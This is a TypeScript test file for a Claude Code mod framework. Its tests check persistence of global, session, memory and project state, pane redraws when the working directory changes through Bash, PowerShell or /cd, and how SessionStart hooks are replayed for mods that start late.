  first.state.global.notes = ['buy milk']
  await notes.settle()

  notes.moveTo('/work/b')
  const reloaded = await notes.session()

  expect(reloaded.state.global.notes).toEqual(['buy milk'])
})

test('a session value comes back after a code reload, and a new conversation starts with its default', async () => {
  const notes = notesIn('/work/a')
  const first = await notes.session()
  first.state.session.draft = 'call mum'
  await notes.settle()

  const reloaded = await notes.session()

  expect(reloaded.state.session.draft).toBe('call mum')

  notes.startConversation('another-conversation')
  const fresh = await notes.session()

  expect(fresh.state.session.draft).toBe('')
})

test('a conversation forked into a new Claude Code process starts with the session values of the conversation cmod names as its parent', async () => {
  const notes = notesIn('/work/a')
  notes.startConversation('parent')
  const parent = await notes.session()
  parent.state.session.draft = 'call mum'
  await notes.settle()
  notes.fakes.cmod.call = async (input) => calledAnswer('notes', input.to === 'cmod' && input.method === 'forkParent' ? { value: 'parent' } : { deny: `no ${input.method}` })

  notes.startConversation('fork')
  const fork = await notes.session()

  expect(fork.state.session.draft).toBe('call mum')
})

test('a conversation with saved session values keeps them and never asks cmod for a parent', async () => {
  const notes = notesIn('/work/a')
  notes.startConversation('parent')
  const first = await notes.session()
  first.state.session.draft = 'call mum'
  await notes.settle()
  const asked: string[] = []
  notes.fakes.cmod.call = async (input) => (asked.push(input.method), 'another')

  const reloaded = await notes.session()

  expect([reloaded.state.session.draft, asked]).toEqual(['call mum', []])
})

test('a memory value starts from its default after a code reload, and a session value comes back', async () => {
  const notes = notesIn('/work/a')
  const first = await notes.session()
  first.state.memory.isTyping = true
  first.state.session.draft = 'call mum'
  await notes.settle()

  const reloaded = await notes.session()

  expect([reloaded.state.memory.isTyping, reloaded.state.session.draft]).toEqual([false, 'call mum'])
})

test('a memory value change redraws the pane', async () => {
  const fake = fakeClaude({ name: 'file-tree', root })
  const redraws: string[] = []
  fake.claude.ui.invalidate = (event) => {
    redraws.push(event)
  }
  const lifecycle = createLifecycle(
    defineMod({
      name: 'file-tree',
      state: { memory: { changed: [] as string[] } },
      setup(mod) {
        mod.ui.pane({ id: 'files', title: 'Files', render: (drawn) => Text({ children: drawn.state.memory.changed.join(',') }) })
      },
    }),
  )
  const filesPane = { surface: 'terminal', component: 'Pane', requestId: 'files', props: { title: 'Files', isFocused: false, bodyColumns: 80, placement: 'dock' } }
  await lifecycle.start(fake.claude, given({ ...pending, name: 'file-tree', isInstalled: true }))
  redraws.length = 0

  ;(lifecycle.mod as Mod<{ memory: { changed: string[] } }>).state.memory.changed = ['README.md']

  expect(redraws).toEqual(['ui.render'])
  expect(textOf(await fire(lifecycle, 'ui.render', filesPane, prompt))).toBe('README.md')
})

test("after the project root changes, the mod reads that project's saved value and redraws", async () => {
  const fake = fakeClaude({ name: 'file-tree', root })
  let projectRoot = '/work/a'
  fake.claude.session.root = async () => projectRoot
  const redraws: string[] = []
  fake.claude.ui.invalidate = (event) => {
    redraws.push(event)
  }
  const lifecycle = createLifecycle(
    defineMod({
      name: 'file-tree',
      state: { project: { expanded: [] as string[] } },
      setup(mod) {
        mod.ui.pane({ id: 'files', title: 'Files', render: (drawn) => Text({ children: drawn.state.project.expanded.join(',') }) })
      },
    }),
  )
  const filesPane = { surface: 'terminal', component: 'Pane', requestId: 'files', props: { title: 'Files', isFocused: false, bodyColumns: 80, placement: 'dock' } }
  await lifecycle.start(fake.claude, given({ ...pending, name: 'file-tree', isInstalled: true }))
  ;(lifecycle.mod as Mod<{ project: { expanded: string[] } }>).state.project.expanded = ['src']
  projectRoot = '/work/b'
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  redraws.length = 0

  projectRoot = '/work/a'
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(redraws).toEqual(['ui.render'])
  expect(textOf(await fire(lifecycle, 'ui.render', filesPane, prompt))).toBe('src')
})

function folderPane() {
  const fake = fakeClaude({ name: 'file-tree', root })
  const session = { root: '/work/a', cwd: '/work/a' }
  fake.claude.session.root = async () => session.root
  fake.claude.session.cwd = async () => session.cwd
  const redraws: string[] = []
  const redrawnFolders: string[] = []
  fake.claude.ui.invalidate = (event) => {
    redraws.push(event)
    redrawnFolders.push(`${sessions.current.project} ${sessions.current.cwd}`)
  }
  const moves: CwdChange[] = []
  const lifecycle = createLifecycle(
    defineMod({
      name: 'file-tree',
      state: { project: { expanded: [] as string[] } },
      setup(mod) {
        mod.ui.pane({ id: 'files', title: 'Files', render: () => Text({ children: `${sessions.current.project} ${sessions.current.cwd}` }) })
        sessions.current.onCwdChange((change) => void moves.push(change))
      },
    }),
  )
  const filesPane = { surface: 'terminal', component: 'Pane', requestId: 'files', props: { title: 'Files', isFocused: false, bodyColumns: 80, placement: 'dock' } }
  const start = async () => {
    await lifecycle.start(fake.claude, given({ ...pending, name: 'file-tree', isInstalled: true }))
    await fake.settle()
  }
  const drawn = async () => textOf(await fire(lifecycle, 'ui.render', filesPane, prompt))
  return { fake, lifecycle, session, redraws, redrawnFolders, moves, start, drawn }
}

const movedTo = (oldCwd: string, newCwd: string): CwdChange => ({ session: 'test-session', cwd: newCwd, previous: oldCwd })

const cd = (args: string) => ({ command: 'cd', args, origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 80 } })

test('a Bash cd moves the current session cwd and redraws the pane', async () => {
  const { lifecycle, session, redraws, start, drawn } = folderPane()
  await start()
  redraws.length = 0
  session.cwd = '/work/a/lib'

  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd lib' } }, {})

  expect(sessions.current.cwd).toBe('/work/a/lib')
  expect(redraws).toEqual(['ui.render'])
  expect(await drawn()).toBe('/work/a /work/a/lib')
})

test('a Bash cd in a command that fails still moves the current session cwd', async () => {
  const { lifecycle, session, redraws, start, drawn } = folderPane()
  await start()
  redraws.length = 0
  session.cwd = '/work/a/lib'

  await fire(lifecycle, 'classic.PostToolUseFailure', { ...postToolUse, hook_event_name: 'PostToolUseFailure', tool_name: 'Bash', tool_input: { command: 'cd lib && make' }, error: 'make: *** No targets.' }, {})

  expect(sessions.current.cwd).toBe('/work/a/lib')
  expect(redraws).toEqual(['ui.render'])
  expect(await drawn()).toBe('/work/a /work/a/lib')
})

test('a PowerShell cd moves the current session cwd', async () => {
  const { lifecycle, session, redraws, start, drawn } = folderPane()
  await start()
  redraws.length = 0
  session.cwd = '/work/a/lib'

  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'PowerShell', tool_input: { command: 'Set-Location lib' } }, {})

  expect(sessions.current.cwd).toBe('/work/a/lib')
  expect(redraws).toEqual(['ui.render'])
  expect(await drawn()).toBe('/work/a /work/a/lib')
})

test("a /cd fires the mod's CwdChanged hook with the old and new folder", async () => {
  const { lifecycle, session, moves, start, drawn } = folderPane()
  await start()
  session.root = '/work/b'
  session.cwd = '/work/b'

  await fire(lifecycle, 'command.run', cd('../b'), {})

  expect(moves).toEqual([movedTo('/work/a', '/work/b')])
  expect(await drawn()).toBe('/work/b /work/b')
})

test('after /cd a pane that draws the session cwd shows the new folder', async () => {
  const { lifecycle, session, redrawnFolders, start } = folderPane()
  await start()
  redrawnFolders.length = 0
  session.root = '/work/b'
  session.cwd = '/work/b'

  await fire(lifecycle, 'command.run', cd('../b'), {})
  session.cwd = '/work/b/lib'
  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd lib' } }, {})

  expect(redrawnFolders).toEqual(['/work/b /work/b', '/work/b /work/b/lib'])
})

test('after /cd while Claude Code still reports the old cwd, the pane redraws once with the new root as the session cwd', async () => {
  const { lifecycle, session, redrawnFolders, moves, start } = folderPane()
  await start()
  redrawnFolders.length = 0
  session.root = '/work/b'

  await fire(lifecycle, 'command.run', cd('../b'), {})

  expect(redrawnFolders).toEqual(['/work/b /work/b'])
  expect(moves).toEqual([movedTo('/work/a', '/work/b')])
})

test('a Bash call between /cd and the next prompt keeps the session cwd on the new root', async () => {
  const { lifecycle, session, moves, start } = folderPane()
  await start()
  session.root = '/work/b'
  await fire(lifecycle, 'command.run', cd('../b'), {})

  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'ls' } }, {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/b', '/work/b'])
  expect(moves).toEqual([movedTo('/work/a', '/work/b')])

  session.cwd = '/work/b'
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(moves).toEqual([movedTo('/work/a', '/work/b')])
})

test('a Bash cd back to the old folder during the lag shows on the next prompt', async () => {
  const { lifecycle, session, moves, start } = folderPane()
  await start()
  session.root = '/work/b'
  await fire(lifecycle, 'command.run', cd('../b'), {})
  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd /work/a' } }, {})

  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/b', '/work/a'])
  expect(moves).toEqual([movedTo('/work/a', '/work/b'), movedTo('/work/b', '/work/a')])
})

test('a /cd the user cancels after a Bash cd out of the project keeps the session cwd where the Bash cd left it', async () => {
  const { lifecycle, session, moves, start } = folderPane()
  await start()
  session.cwd = '/tmp'
  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd /tmp' } }, {})

  await fire(lifecycle, 'command.run', cd('../b'), {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/a', '/tmp'])
  expect(moves).toEqual([movedTo('/work/a', '/tmp')])
})

test('a Bash cd out of the project after a /cd whose project failed to load moves the current session cwd out of it', async () => {
  const { fake, lifecycle, session, moves, start } = folderPane()
  const storeGet = fake.claude.store.get
  let isStoreLocked = false
  fake.claude.store.get = async (key) => (isStoreLocked ? Promise.reject(new Error('the store file is locked')) : storeGet(key))
  await start()
  session.root = '/work/b'
  isStoreLocked = true
  await fire(lifecycle, 'command.run', cd('../b'), {})
  isStoreLocked = false
  session.cwd = '/tmp'

  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd /tmp' } }, {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/b', '/tmp'])
  expect(moves).toEqual([movedTo('/work/a', '/tmp')])
})

test('a Bash cd fires CwdChanged', async () => {
  const { lifecycle, session, moves, start } = folderPane()
  await start()
  session.cwd = '/work/a/lib'

  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd lib' } }, {})
  await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'ls' } }, {})

  expect(moves).toEqual([movedTo('/work/a', '/work/a/lib')])
})

test('two overlapping Bash calls fire CwdChanged once', async () => {
  const { lifecycle, session, moves, start } = folderPane()
  await start()
  session.cwd = '/work/a/lib'
  const bash = (command: string) => fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command } }, {})

  await Promise.all([bash('cd lib'), bash('ls')])

  expect(moves).toEqual([movedTo('/work/a', '/work/a/lib')])
})

test('a folder move whose project fails to load fires CwdChanged on the retry', async () => {
  const { fake, lifecycle, session, moves, start } = folderPane()
  const storeGet = fake.claude.store.get
  let isStoreLocked = false
  fake.claude.store.get = async (key) => (isStoreLocked ? Promise.reject(new Error('the store file is locked')) : storeGet(key))
  await start()
  session.root = '/work/b'
  session.cwd = '/work/b'
  isStoreLocked = true

  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/a', '/work/a'])
  expect(moves).toEqual([])

  isStoreLocked = false
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/b', '/work/b'])
  expect(moves).toEqual([movedTo('/work/a', '/work/b')])
})

test('two overlapping folder moves that both fail leave the session cwd at the last loaded folder', async () => {
  const { fake, lifecycle, session, moves, start } = folderPane()
  const storeGet = fake.claude.store.get
  let isStoreLocked = false
  let failLockedReads: () => void = () => undefined
  const lockedReadsFail = new Promise<void>((resolve) => (failLockedReads = resolve))
  fake.claude.store.get = async (key) => {
    if (!isStoreLocked) return storeGet(key)
    await lockedReadsFail
    throw new Error('the store file is locked')
  }
  await start()
  isStoreLocked = true
  session.root = '/work/b'
  session.cwd = '/work/b'
  const first = fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fake.settle()
  session.root = '/work/c'
  session.cwd = '/work/c'
  const second = fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fake.settle()

  failLockedReads()
  await Promise.all([first, second])

  expect([sessions.current.project, sessions.current.cwd]).toEqual(['/work/a', '/work/a'])
  expect(moves).toEqual([])
})

test('a /cd the user cancels moves nothing', async () => {
  const { fake, lifecycle, redraws, moves, start, drawn } = folderPane()
  await start()
  const mod = lifecycle.mod as Mod<{ project: { expanded: string[] } }>
  mod.state.project.expanded = ['src']
  await fake.settle()
  redraws.length = 0

  await fire(lifecycle, 'command.run', cd('../b'), {})

  expect([sessions.current.project, sessions.current.cwd, mod.state.project.expanded]).toEqual(['/work/a', '/work/a', ['src']])
  expect(redraws).toEqual([])
  expect(moves).toEqual([])
  expect(await drawn()).toBe('/work/a /work/a')
})

test('two projects setting one project value keep both', async () => {
  const definition = defineMod({ name: 'file-tree', state: { project: { expanded: [] as string[] } }, setup() {} })
  const first = fakeClaude({ name: 'file-tree', root })
  const sessionIn = async (projectRoot: string) => {
    const fake = fakeClaude({ name: 'file-tree', root })
    Object.assign(fake.claude.store, first.claude.store)
    fake.claude.session.root = async () => projectRoot
    const lifecycle = createLifecycle(definition)
    await lifecycle.start(fake.claude, given({ ...pending, name: 'file-tree', isInstalled: true }))
    return lifecycle.mod as Mod<{ project: { expanded: string[] } }>
  }
  const [inA, inB] = await Promise.all([sessionIn('/work/a'), sessionIn('/work/b')])

  inA.state.project.expanded = ['src']
  inB.state.project.expanded = ['docs']
  await first.settle()

  expect((await sessionIn('/work/a')).state.project.expanded).toEqual(['src'])
  expect((await sessionIn('/work/b')).state.project.expanded).toEqual(['docs'])
})

test("a project whose saved state fails to load leaves the mod in the project it was in, and the next prompt loads it", async () => {
  const fake = fakeClaude({ name: 'file-tree', root })
  let projectRoot = '/work/a'
  fake.claude.session.root = async () => projectRoot
  const storeGet = fake.claude.store.get
  let isStoreLocked = false
  fake.claude.store.get = async (key) => (isStoreLocked ? Promise.reject(new Error('the store file is locked')) : storeGet(key))
  const lifecycle = createLifecycle(defineMod({ name: 'file-tree', state: { project: { expanded: [] as string[] } }, setup() {} }))
  await lifecycle.start(fake.claude, given({ ...pending, name: 'file-tree', isInstalled: true }))
  const mod = lifecycle.mod as Mod<{ project: { expanded: string[] } }>
  mod.state.project.expanded = ['src']
  await fake.settle()
  projectRoot = '/work/b'
  isStoreLocked = true

  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect([sessions.current.project, mod.state.project.expanded]).toEqual(['/work/a', ['src']])
  expect(lifecycle.toasts).toContainEqual({ type: 'error', message: 'Keeps the state of /work/a until the next prompt or folder move', description: 'the store file is locked' })

  isStoreLocked = false
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect([sessions.current.project, mod.state.project.expanded]).toEqual(['/work/b', []])
})

function sessionStartMod() {
  const sources: string[] = []
  const definition = defineMod({
    name: 'safe-delete',
    setup() {
      sessions.current.beforeSessionStart((start) => {
        sources.push(start.source)
        return { note: `safe-delete saw ${start.source}` }
      })
    },
  })
  return { sources, definition }
}

const sessionStart = (source: 'startup' | 'resume') => ({ session_id: 'test-session', transcript_path: '/t', cwd: '/work', hook_event_name: 'SessionStart', source })

const appendedNotes = (fake: ReturnType<typeof fakeClaude>) => fake.calls.filter((call) => call.call === 'session.append').map((call) => (call.args[0] as { message: { content: { text: string }[] } }).message.content[0]?.text)

test("an installed mod's SessionStart context reaches Claude Code on a fresh start", async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)

  const starting = lifecycle.start(fake.claude, given({ ...pending, isInstalled: true, granted: ['prompt'] }))
  const answer = fire(lifecycle, 'classic.SessionStart', sessionStart('resume'), {})
  await starting
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(await answer).toEqual({ additionalContext: ['<safe-delete_mod>\nsafe-delete saw resume\n</safe-delete_mod>'] })
  expect(sources).toEqual(['resume'])
  expect(fake.shown.debug).toEqual([])
})

test('a mod that starts after SessionStart passed runs its SessionStart hooks once, and its note without the prompt grant is dropped, as on time', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const step = controlledStream()
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => step.stream
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)
  await lifecycle.start(fake.claude, given(pending))

  await fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})
  step.print('done safe-delete 0.2.0')
  step.exit(0)
  await fake.settle()
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(sources).toEqual(['startup'])
  expect(appendedNotes(fake)).toEqual([])
  expect(fake.shown.debug).toEqual([])
})

test('a mod that started before SessionStart runs its SessionStart hooks once', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)
  await lifecycle.start(fake.claude, given({ ...pending, isInstalled: true }))

  await fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(sources).toEqual(['startup'])
})

test('a mod whose install finished before SessionStart runs its SessionStart hooks once, when SessionStart starts it', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => finished(['done safe-delete 0.2.0'], 0)
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)
  await lifecycle.start(fake.claude, given(pending))
  await fake.settle()

  await fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(sources).toEqual(['startup'])
})

test('a SessionStart before session.start, as claude -p sends it, passes on at once and replays once the mod starts', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)

  expect(await fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})).toEqual({})
  expect(sources).toEqual([])

  await lifecycle.start(fake.claude, given({ ...pending, isInstalled: true, granted: ['prompt'] }))
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(sources).toEqual(['startup'])
  expect(appendedNotes(fake)).toEqual(['<safe-delete_mod>\nsafe-delete saw startup\n</safe-delete_mod>'])
  expect(fake.shown.debug).toEqual([])
})

test('a SessionStart held past the limit passes on and replays once the mod starts', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const timers: { ms: number; fire: () => void; isCancelled: boolean }[] = []
  fake.fakes.clock.after = (ms, fire) => {
    const made = { ms, fire, isCancelled: false }
    timers.push(made)
    return { cancel: () => (made.isCancelled = true) }
  }
  let finishRead: () => void = () => undefined
  const slowRead = new Promise<void>((resolve) => (finishRead = resolve))
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)
  let isAnswered = false

  const starting = lifecycle.start(fake.claude, async () => {
    await slowRead
    return { ...pending, isInstalled: true, granted: ['prompt'] }
  })
  const answer = fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {}).finally(() => (isAnswered = true))
  await fake.settle()
  timers.find((made) => made.ms === 9_000)?.fire()
  await fake.settle()

  expect(isAnswered).toBe(true)
  expect(await answer).toEqual({})
  expect(sources).toEqual([])

  finishRead()
  await starting
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(sources).toEqual(['startup'])
  expect(appendedNotes(fake)).toEqual(['<safe-delete_mod>\nsafe-delete saw startup\n</safe-delete_mod>'])
  expect(fake.shown.debug).toEqual([])
})

test('a SessionStart answered before the limit cancels its timer', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const timers: { ms: number; isCancelled: boolean }[] = []
  fake.fakes.clock.after = (ms) => {
    const made = { ms, isCancelled: false }
    timers.push(made)
    return { cancel: () => (made.isCancelled = true) }
  }
  const { sources, definition } = sessionStartMod()
  const lifecycle = createLifecycle(definition)

  const starting = lifecycle.start(fake.claude, given({ ...pending, isInstalled: true, granted: ['prompt'] }))
  const answer = fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})
  await starting

  expect(await answer).toEqual({ additionalContext: ['<safe-delete_mod>\nsafe-delete saw startup\n</safe-delete_mod>'] })
  expect(sources).toEqual(['startup'])
  expect(timers).toEqual([{ ms: 9_000, isCancelled: true }])
})

test('a late SessionStart replay that throws leaves the mod active', async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const step = controlledStream()
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => step.stream
  const lifecycle = createLifecycle(
    defineMod({
      name: 'safe-delete',
      setup: () =>
        void sessions.current.beforeSessionStart(async () => {
          throw new Error('no session file')
        }),
    }),
  )
  await lifecycle.start(fake.claude, given(pending))

  await fire(lifecycle, 'classic.SessionStart', sessionStart('startup'), {})
  step.print('done safe-delete 0.2.0')
  step.exit(0)
  await fake.settle()
  await fire(lifecycle, 'classic.UserPromptSubmit', promptSubmit, {})

  expect(lifecycle.phase).toBe('active')
  expect(lifecycle.failure).toBeUndefined()
  expect(lifecycle.toasts).toContainEqual({ type: 'error', message: 'The beforeSessionStart listener failed', description: 'no session file' })
})

test("a mod that finishes installing before /clear replays only the cleared session's SessionStart", async () => {
  const fake = fakeClaude({ name: 'safe-delete', root })
  const step = controlledStream()
  fake.fakes.process.run = cmodOnPath
  fake.fakes.process.spawn = () => step.stream
  const seen: string[] = []
  const lifecycle = createLifecycle(
    defineMod({
      name: 'safe-delete',
      setup() {
        sessions.current.beforeSessionStart((start) => void seen.push(`${start.source} ${start.session}`))
      },
    }),
  )
  await lifecycle.start(fake.claude, given(pending))

  await fire(lifecycle, 'classic.SessionStart', { ...sessionStart('startup'), session_id: 'first' }, {})
  step.print('done safe-delete 0.2.0')
  step.exit(0)
  await fake.settle()
  await fire(lifecycle, 'classic.SessionStart', { ...sessionStart('startup'), session_id: 'second', source: 'clear' }, {})

  expect(seen).toEqual(['clear second'])
})
